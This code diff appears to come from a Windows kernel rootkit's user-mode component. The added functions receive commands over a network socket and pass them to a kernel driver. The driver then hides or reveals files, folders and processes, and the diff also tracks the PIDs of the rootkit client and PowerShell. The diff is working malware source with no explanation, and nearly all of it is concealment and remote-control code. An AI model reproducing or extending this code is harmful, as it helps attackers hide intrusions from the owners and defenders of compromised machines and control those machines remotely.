@@ -73,6 +73,11 @@ int CallKernelDriver(SOCKET tosock, ROOTKIT_MEMORY* RootkInst, BOOL PassBack, HA
 int InitialKernelCall(HANDLE* PipeHandle, LogFile* MediumLog) {
 	ROOTKIT_MEMORY InitData = { 0 };
 	InitData.MedPID = (USHORT)GetCurrentProcessId();
+	InitData.MainPID = (USHORT)GetPID("meow_client.exe");
+	InitData.SemiPID = (USHORT)GetPID("powershell.exe");
+	if (InitData.SemiPID == NULL || InitData.MainPID == NULL) {
+		return 0;
+	}
 	return CallKernelDriver(NULL, &InitData, FALSE, PipeHandle, MediumLog);
 }
 
@@ -400,6 +405,13 @@ int SysInfoKernelCall(SOCKET tosock, ROOTKIT_MEMORY* RootkInst, PVOID AttrBuffer
 		if (result.err || result.value != (int)TotalSize) {
 			return 0;
 		}
+
+
+		// Send back updated attribute buffer:
+		result = root_internet::SendData(tosock, AttrBuffer, (int)AttrBufferSize, FALSE, 0);
+		if (result.err || result.value != AttrBufferSize) {
+			return 0;
+		}
 		return 1;
 	}
 
@@ -460,4 +472,130 @@ int AllocSpecKernelCall(SOCKET tosock, ROOTKIT_MEMORY* RootkInst, char* ModuleNa
 		result = root_internet::SendData(tosock, &FailedSize, sizeof(FailedSize), FALSE, 0);
 		return 0;
 	}
+}
+
+
+
+
+int HideFileKernelCall(SOCKET tosock, ROOTKIT_MEMORY* RootkInst, char* ModuleName, HANDLE* PipeHandle, LogFile* MediumLog) {
+	PASS_DATA result;
+	int DriverRes = FALSE;
+	PVOID InitAddr = NULL;
+	char FailedSize = 1;
+	NTSTATUS RequestStatus = STATUS_UNSUCCESSFUL;
+	WCHAR FilePath[1024] = { 0 };
+	DWORD FilePathLength = 0;
+	PVOID DummyAddress = NULL;
+
+
+	// Receive the request status to verify if other preperations are needed:
+	result = root_internet::RecvData(tosock, sizeof(NTSTATUS), &RequestStatus, FALSE, 0);
+	if (result.err || result.value != sizeof(NTSTATUS)) {
+		return 0;
+	}
+	if (RequestStatus == HIDE_FILEFOLDER) {
+		result = root_internet::RecvData(tosock, sizeof(DWORD), &FilePathLength, FALSE, 0);
+		if (result.err || result.value != sizeof(DWORD)) {
+			return 0;
+		}
+		result = root_internet::RecvData(tosock, FilePathLength, FilePath, FALSE, 0);
+		if (result.err || result.value != FilePathLength) {
+			return 0;
+		}
+	}
+
+	// Receive the main structure with the parameters for the operation:
+	result = root_internet::RecvData(tosock, sizeof(ROOTKIT_MEMORY), RootkInst, FALSE, 0);
+	if (result.err || result.value != sizeof(ROOTKIT_MEMORY)) {
+		return 0;
+	}
+
+
+	// Set important arguments:
+	if (RequestStatus == HIDE_FILEFOLDER) {
+		RootkInst->Buffer = (PVOID)FilePath;
+		RootkInst->Size = (ULONG64)FilePathLength;
+	}
+	else if (RequestStatus == SHOWHIDDEN_FILEFOLDER) {
+		RootkInst->Out = &DummyAddress;
+	}
+
+
+	// Pass struct argument to the driver:
+	RootkInst->Unexpected = successful;
+	RootkInst->MdlName = ModuleName;
+	RootkInst->MainPID = (USHORT)GetCurrentProcessId();;
+	RootkInst->MedPID = (USHORT)GetCurrentProcessId();;
+	DriverRes = CallKernelDriver(tosock, RootkInst, TRUE, PipeHandle, MediumLog);
+	if (!RootkInst->IsFlexible) {
+		printf("transformation of regular data from KM-UM confirmed!\n");
+	}
+	else {
+		printf("transformation of regular data from KM-UM not working correctly!!!\n");
+	}
+
+
+	// Parse returned data correctly (after sending back main struct):
+	if (RequestStatus == SHOWHIDDEN_FILEFOLDER) {
+		result = root_internet::RecvData(tosock, RootkInst->Size, RootkInst->Out, FALSE, 0);
+		if (result.err || result.value != RootkInst->Size) {
+			return 0;
+		}
+	}
+	return 1;
+}
+
+
+
+
+int HideProcessKernelCall(SOCKET tosock, ROOTKIT_MEMORY* RootkInst, char* ModuleName, HANDLE* PipeHandle, LogFile* MediumLog) {
+	PASS_DATA result;
+	int DriverRes = FALSE;
+	PVOID InitAddr = NULL;
+	char FailedSize = 1;
+	NTSTATUS RequestStatus = STATUS_UNSUCCESSFUL;
+	PVOID DummyAddress = NULL;
+
+
+	// Receive the request status to verify if other preperations are needed (ADD PREOPERATIONS HERE IF NEEDED):
+	result = root_internet::RecvData(tosock, sizeof(NTSTATUS), &RequestStatus, FALSE, 0);
+	if (result.err || result.value != sizeof(NTSTATUS)) {
+		return 0;
+	}
+
+
+	// Receive the main structure with the parameters for the operation:
+	result = root_internet::RecvData(tosock, sizeof(ROOTKIT_MEMORY), RootkInst, FALSE, 0);
+	if (result.err || result.value != sizeof(ROOTKIT_MEMORY)) {
+		return 0;
+	}
+
+
+	// Set important arguments and verify parameters before sending to driver:
+	if (RequestStatus == SHOWHIDDEN_PROCESS) {
+		RootkInst->Out = &DummyAddress;
+	}
+
+
+	// Pass struct argument to the driver:
+	RootkInst->Unexpected = successful;
+	RootkInst->MdlName = ModuleName;
+	RootkInst->MedPID = (USHORT)GetCurrentProcessId();;
+	DriverRes = CallKernelDriver(tosock, RootkInst, TRUE, PipeHandle, MediumLog);
+	if (!RootkInst->IsFlexible) {
+		printf("transformation of regular data from KM-UM confirmed!\n");
+	}
+	else {
+		printf("transformation of regular data from KM-UM not working correctly!!!\n");
+	}
+
+
+	// Parse returned data correctly (after sending back main struct):
+	if (RequestStatus == SHOWHIDDEN_PROCESS) {
+		result = root_internet::RecvData(tosock, RootkInst->Size, RootkInst->Out, FALSE, 0);
+		if (result.err || result.value != RootkInst->Size) {
+			return 0;
+		}
+	}
+	return 1;
 }
